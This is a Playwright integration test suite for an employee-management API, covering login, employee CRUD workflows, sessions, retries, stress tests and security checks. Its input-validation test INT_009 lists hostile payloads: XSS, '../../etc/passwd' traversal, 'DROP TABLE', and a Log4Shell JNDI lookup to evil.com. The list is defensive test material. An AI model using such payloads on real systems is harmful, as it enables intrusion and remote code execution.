import { test, expect } from '@playwright/test';
import { AuthApiClient } from '../../src/api/auth.api';
import { EmployeeApiClient, Employee } from '../../src/api/employee.api';
import { ApiTestData, ApiTestDataHelper } from '../../src/data/api-test-data';
import { ApiHelpers } from '../../src/utils/api-helpers';

test.describe('API Integration Tests', () => {
  let authClient: AuthApiClient;
  let employeeClient: EmployeeApiClient;
  let createdEmployeeIds: string[] = [];

  test.beforeEach(async () => {
    authClient = new AuthApiClient();
    employeeClient = new EmployeeApiClient();
    
    await authClient.init();
    await employeeClient.init();
  });

  test.afterEach(async () => {
    // Cleanup created employees
    if (createdEmployeeIds.length > 0) {
      try {
        await employeeClient.deleteEmployees(createdEmployeeIds);
      } catch (error) {
        console.log('Cleanup error:', error);
      }
      createdEmployeeIds = [];
    }
    
    await authClient.dispose();
    await employeeClient.dispose();
  });

  test.describe('End-to-End Workflows', () => {
    test('INT_001 - Complete Employee Management Workflow @integration @smoke', async () => {
      const testStartTime = Date.now();
      const workflowSteps = [];

      // Step 1: Authentication
      const authStartTime = Date.now();
      const authResponse = await authClient.login(ApiTestData.validAuth.credentials);
      const authDuration = Date.now() - authStartTime;
      
      expect(authResponse.data.success).toBe(true);
      workflowSteps.push({
        name: 'Authentication',
        success: authResponse.data.success,
        duration: authDuration
      });

      // Step 2: Get initial employee count
      const countStartTime = Date.now();
      const initialCount = await employeeClient.getEmployeesCount();
      const countDuration = Date.now() - countStartTime;
      
      expect(initialCount).toBeGreaterThanOrEqual(0);
      workflowSteps.push({
        name: 'Get Employee Count',
        success: true,
        duration: countDuration
      });

      // Step 3: Create new employee
      const employeeData: Employee = {
        ...ApiTestDataHelper.generateRandomEmployee()
      };
      
      const createStartTime = Date.now();
      const createResponse = await employeeClient.createEmployee(employeeData);
      const createDuration = Date.now() - createStartTime;
      
      expect(createResponse.success).toBe(true);
      const empNumber = createResponse.data.data.empNumber!;
      createdEmployeeIds.push(empNumber);
      
      workflowSteps.push({
        name: 'Create Employee',
        success: createResponse.success,
        duration: createDuration
      });

      // Step 4: Verify employee was created by searching
      const searchStartTime = Date.now();
      const searchResponse = await employeeClient.searchByEmployeeId(employeeData.employeeId);
      const searchDuration = Date.now() - searchStartTime;
      
      expect(searchResponse.data.data.length).toBeGreaterThan(0);
      const foundEmployee = searchResponse.data.data.find(emp => emp.employeeId === employeeData.employeeId);
      expect(foundEmployee).toBeDefined();
      
      workflowSteps.push({
        name: 'Search Employee',
        success: searchResponse.success && !!foundEmployee,
        duration: searchDuration
      });

      // Step 5: Update employee
      const updateData = {
        firstName: 'Updated',
        lastName: 'Employee'
      };
      
      const updateStartTime = Date.now();
      const updateResponse = await employeeClient.updateEmployee(empNumber, updateData);
      const updateDuration = Date.now() - updateStartTime;
      
      expect(updateResponse.success).toBe(true);
      expect(updateResponse.data.data.firstName).toBe(updateData.firstName);
      
      workflowSteps.push({
        name: 'Update Employee',
        success: updateResponse.success,
        duration: updateDuration
      });

      // Step 6: Verify update by getting employee details
      const getStartTime = Date.now();
      const getResponse = await employeeClient.getEmployeeById(empNumber);
      const getDuration = Date.now() - getStartTime;
      
      expect(getResponse.success).toBe(true);
      expect(getResponse.data.data.firstName).toBe(updateData.firstName);
      
      workflowSteps.push({
        name: 'Get Updated Employee',
        success: getResponse.success,
        duration: getDuration
      });

      // Step 7: Delete employee
      const deleteStartTime = Date.now();
      const deleteResponse = await employeeClient.deleteEmployee(empNumber);
      const deleteDuration = Date.now() - deleteStartTime;
      
      expect(deleteResponse.success).toBe(true);
      
      workflowSteps.push({
        name: 'Delete Employee',
        success: deleteResponse.success,
        duration: deleteDuration
      });

      // Step 8: Verify deletion
      const verifyDeleteStartTime = Date.now();
      const verifyDeleteResponse = await employeeClient.getEmployeeById(empNumber);
      const verifyDeleteDuration = Date.now() - verifyDeleteStartTime;
      
      expect(verifyDeleteResponse.status).toBe(404);
      
      workflowSteps.push({
        name: 'Verify Deletion',
        success: verifyDeleteResponse.status === 404,
        duration: verifyDeleteDuration
      });

      // Workflow completed successfully - remove from cleanup list
      createdEmployeeIds = createdEmployeeIds.filter(id => id !== empNumber);

      // Generate workflow summary
      const totalWorkflowTime = Date.now() - testStartTime;
      const workflowSummary = ApiHelpers.generateTestSummary(workflowSteps);
      
      console.log('Workflow Summary:', workflowSummary);
      console.log('Total Workflow Time:', totalWorkflowTime);
      
      expect(workflowSummary.passed).toBe(workflowSummary.totalTests);
      expect(totalWorkflowTime).toBeLessThan(30000); // Should complete within 30 seconds
    });

    test('INT_002 - Multi-User Session Management @integration', async () => {
      // Create multiple authentication clients to simulate different users
      const clients = await Promise.all([
        (async () => { const c = new AuthApiClient(); await c.init(); return c; })(),
        (async () => { const c = new AuthApiClient(); await c.init(); return c; })(),
        (async () => { const c = new AuthApiClient(); await c.init(); return c; })()
      ]);

      try {
        // All clients login simultaneously
        const loginPromises = clients.map(client => 
          client.login(ApiTestData.validAuth.credentials)
        );
        const loginResponses = await Promise.all(loginPromises);

        // Verify all logins succeeded
        loginResponses.forEach(response => {
          expect(response.data.success).toBe(true);
        });

        // Verify each client has unique session
        const sessionIds = clients.map(client => client.getCurrentSessionId());
        const uniqueSessions = new Set(sessionIds);
        expect(uniqueSessions.size).toBe(clients.length);

        // Test concurrent operations
        const employeeClients = clients.map(client => {
          const empClient = new EmployeeApiClient();
          empClient.setAuthTokens({
            sessionId: client.getCurrentSessionId()!,
            csrfToken: client.getCurrentCSRFToken()!
          });
          return empClient;
        });

        // Concurrent employee list requests
        const listPromises = employeeClients.map(client => client.getEmployeeList());
        const listResponses = await Promise.all(listPromises);

        listResponses.forEach(response => {
          expect(response.success).toBe(true);
        });

        // Logout all clients
        const logoutPromises = clients.map(client => client.logout());
        const logoutResponses = await Promise.all(logoutPromises);

        logoutResponses.forEach(response => {
          expect(response.data.success).toBe(true);
        });

      } finally {
        // Cleanup
        await Promise.all(clients.map(client => client.dispose()));
      }
    });

    test('INT_003 - Bulk Employee Operations @integration @performance', async () => {
      // Authenticate
      await employeeClient.authenticate();

      const employeeCount = 10;
      const employees: Employee[] = [];
      
      // Generate test employees
      for (let i = 0; i < employeeCount; i++) {
        employees.push(ApiTestDataHelper.generateRandomEmployee());
      }

      // Bulk create employees
      const createStartTime = Date.now();
      const createPromises = employees.map(emp => employeeClient.createEmployee(emp));
      const createResponses = await Promise.all(createPromises);
      const createDuration = Date.now() - createStartTime;

      // Track successful creations
      const successfulCreations = createResponses.filter(r => r.success);
      successfulCreations.forEach(response => {
        if (response.data.data.empNumber) {
          createdEmployeeIds.push(response.data.data.empNumber);
        }
      });

      expect(successfulCreations.length).toBeGreaterThan(0);
      console.log(`Created ${successfulCreations.length}/${employeeCount} employees in ${createDuration}ms`);

      // Bulk search operations
      const searchStartTime = Date.now();
      const searchPromises = employees.slice(0, 5).map(emp => 
        employeeClient.searchByEmployeeId(emp.employeeId)
      );
      const searchResponses = await Promise.all(searchPromises);
      const searchDuration = Date.now() - searchStartTime;

      searchResponses.forEach(response => {
        expect(response.success).toBe(true);
      });

      console.log(`Completed ${searchPromises.length} searches in ${searchDuration}ms`);

      // Performance validation
      const avgCreateTime = createDuration / employeeCount;
      const avgSearchTime = searchDuration / searchPromises.length;

      expect(avgCreateTime).toBeLessThan(ApiTestData.performance.maxResponseTime.employeeCreate);
      expect(avgSearchTime).toBeLessThan(ApiTestData.performance.maxResponseTime.employeeSearch);
    });

    test('INT_004 - Data Consistency Validation @integration @data', async () => {
      await employeeClient.authenticate();

      const originalEmployee: Employee = {
        ...ApiTestDataHelper.generateRandomEmployee(),
        middleName: 'ConsistencyTest'
      };

      // Create employee
      const createResponse = await employeeClient.createEmployee(originalEmployee);
      expect(createResponse.success).toBe(true);
      
      const empNumber = createResponse.data.data.empNumber!;
      createdEmployeeIds.push(empNumber);

      // Verify data consistency through different access methods
      
      // Method 1: Get by ID
      const getByIdResponse = await employeeClient.getEmployeeById(empNumber);
      expect(getByIdResponse.success).toBe(true);

      // Method 2: Search by employee ID
      const searchByIdResponse = await employeeClient.searchByEmployeeId(originalEmployee.employeeId);
      expect(searchByIdResponse.success).toBe(true);
      expect(searchByIdResponse.data.data.length).toBeGreaterThan(0);
      
      const searchResult = searchByIdResponse.data.data.find(emp => emp.empNumber === empNumber);
      expect(searchResult).toBeDefined();

      // Method 3: Search by name
      const searchByNameResponse = await employeeClient.searchByName(
        originalEmployee.firstName,
        originalEmployee.lastName
      );
      expect(searchByNameResponse.success).toBe(true);
      
      const nameSearchResult = searchByNameResponse.data.data.find(emp => emp.empNumber === empNumber);
      expect(nameSearchResult).toBeDefined();

      // Validate data consistency across all methods
      const fieldsToCheck: (keyof Employee)[] = ['firstName', 'lastName', 'employeeId'];
      
      const consistencyChecks = [
        ApiHelpers.validateDataConsistency(originalEmployee, getByIdResponse.data.data, fieldsToCheck),
        ApiHelpers.validateDataConsistency(originalEmployee, searchResult!, fieldsToCheck),
        ApiHelpers.validateDataConsistency(originalEmployee, nameSearchResult!, fieldsToCheck)
      ];

      expect(consistencyChecks.every(check => check)).toBe(true);
    });
  });

  test.describe('Error Recovery and Resilience', () => {
    test('INT_005 - Session Timeout and Recovery @integration @resilience', async () => {
      // Login
      const loginResponse = await authClient.login(ApiTestData.validAuth.credentials);
      expect(loginResponse.data.success).toBe(true);

      // Set auth tokens for employee client
      employeeClient.setAuthTokens({
        sessionId: authClient.getCurrentSessionId()!,
        csrfToken: authClient.getCurrentCSRFToken()!
      });

      // Verify authenticated access works
      const initialResponse = await employeeClient.getEmployeeList();
      expect(initialResponse.success).toBe(true);

      // Simulate session timeout by clearing tokens
      authClient.clearAuthTokens();
      employeeClient.clearAuthTokens();

      // Try operation with invalid session - should fail
      const unauthorizedResponse = await employeeClient.getEmployeeList();
      expect(unauthorizedResponse.status).toBeGreaterThanOrEqual(401);

      // Re-authenticate and retry
      const reAuthResponse = await authClient.login(ApiTestData.validAuth.credentials);
      expect(reAuthResponse.data.success).toBe(true);

      // Update employee client with new tokens
      employeeClient.setAuthTokens({
        sessionId: authClient.getCurrentSessionId()!,
        csrfToken: authClient.getCurrentCSRFToken()!
      });

      // Verify operations work again
      const recoveredResponse = await employeeClient.getEmployeeList();
      expect(recoveredResponse.success).toBe(true);
    });

    test('INT_006 - Network Resilience and Retry Logic @integration @resilience', async () => {
      await employeeClient.authenticate();

      let attempts = 0;
      const maxAttempts = 3;

      // Test retry logic with a function that fails first few times
      const unreliableApiCall = async () => {
        attempts++;
        if (attempts < 2) {
          throw new Error('Simulated network error');
        }
        return await employeeClient.getEmployeeList();
      };

      const result = await ApiHelpers.retryApiCall(unreliableApiCall, maxAttempts);
      
      expect(result.success).toBe(true);
      expect(attempts).toBe(2); // Should succeed on second attempt
    });

    test('INT_007 - Concurrent Operations Stress Test @integration @stress', async () => {
      await employeeClient.authenticate();

      const concurrentOperations = 20;
      const operationPromises = [];

      // Mix of different operations
      for (let i = 0; i < concurrentOperations; i++) {
        if (i % 4 === 0) {
          // Get employee list
          operationPromises.push(employeeClient.getEmployeeList());
        } else if (i % 4 === 1) {
          // Search operations
          operationPromises.push(employeeClient.searchByName('John', 'Doe'));
        } else if (i % 4 === 2) {
          // Create employee
          const emp = ApiTestDataHelper.generateRandomEmployee();
          operationPromises.push(employeeClient.createEmployee(emp));
        } else {
          // Get employee count
          operationPromises.push(employeeClient.getEmployeesCount());
        }
      }

      const startTime = Date.now();
      const results = await Promise.allSettled(operationPromises);
      const duration = Date.now() - startTime;

      // Track created employees for cleanup
      results.forEach((result, index) => {
        if (result.status === 'fulfilled' && index % 4 === 2) {
          const response = result.value as any;
          if (response.success && response.data?.data?.empNumber) {
            createdEmployeeIds.push(response.data.data.empNumber);
          }
        }
      });

      const successful = results.filter(r => r.status === 'fulfilled').length;
      const failed = results.length - successful;

      console.log(`Concurrent Operations: ${successful} succeeded, ${failed} failed in ${duration}ms`);

      // At least 80% should succeed
      expect(successful / results.length).toBeGreaterThanOrEqual(0.8);
      
      // Should complete within reasonable time
      expect(duration).toBeLessThan(60000); // 60 seconds
    });
  });

  test.describe('Security Integration Tests', () => {
    test('INT_008 - Cross-User Data Access Protection @integration @security', async () => {
      // Create two separate authenticated clients
      const client1 = new EmployeeApiClient();
      const client2 = new EmployeeApiClient();
      
      await client1.init();
      await client2.init();

      try {
        // Both clients authenticate
        await client1.authenticate();
        await client2.authenticate();

        // Client 1 creates an employee
        const employeeData = ApiTestDataHelper.generateRandomEmployee();
        const createResponse = await client1.createEmployee(employeeData);
        expect(createResponse.success).toBe(true);
        
        const empNumber = createResponse.data.data.empNumber!;
        createdEmployeeIds.push(empNumber);

        // Client 2 tries to access the employee (should work as same user in demo)
        const accessResponse = await client2.getEmployeeById(empNumber);
        expect(accessResponse.success).toBe(true);

        // Test that unauthenticated access is blocked
        const unauthClient = new EmployeeApiClient();
        await unauthClient.init();
        
        const unauthorizedResponse = await unauthClient.getEmployeeById(empNumber);
        expect(unauthorizedResponse.status).toBeGreaterThanOrEqual(401);
        
        await unauthClient.dispose();

      } finally {
        await client1.dispose();
        await client2.dispose();
      }
    });

    test('INT_009 - Input Validation and Sanitization @integration @security', async () => {
      await employeeClient.authenticate();

      const maliciousInputs = [
        ApiTestData.invalidAuth.sqlInjection.username,
        ApiTestData.invalidAuth.xssPayload.username,
        ApiTestData.search.invalidSearchParams.specialCharacters,
        '<img src=x onerror=alert(1)>',
        '../../etc/passwd',
        'DROP TABLE employees;',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const maliciousInput of maliciousInputs) {
        // Test in employee creation
        const maliciousEmployee: Employee = {
          firstName: maliciousInput,
          lastName: maliciousInput,
          employeeId: ApiTestDataHelper.generateEmployeeId()
        };

        const createResponse = await employeeClient.createEmployee(maliciousEmployee);
        
        // Should either sanitize input and succeed, or fail gracefully
        if (createResponse.success) {
          // If successful, input should be sanitized
          expect(createResponse.data.data.firstName).not.toContain('<script');
          expect(createResponse.data.data.firstName).not.toContain('DROP TABLE');
          
          if (createResponse.data.data.empNumber) {
            createdEmployeeIds.push(createResponse.data.data.empNumber);
          }
        } else {
          // If failed, should not cause server error
          expect(createResponse.status).toBeLessThan(500);
        }

        // Test in search
        const searchResponse = await employeeClient.searchByName(maliciousInput, maliciousInput);
        ApiHelpers.validateSqlInjectionSafety(searchResponse);
        ApiHelpers.validateXssSafety(searchResponse);
      }
    });
  });
}); 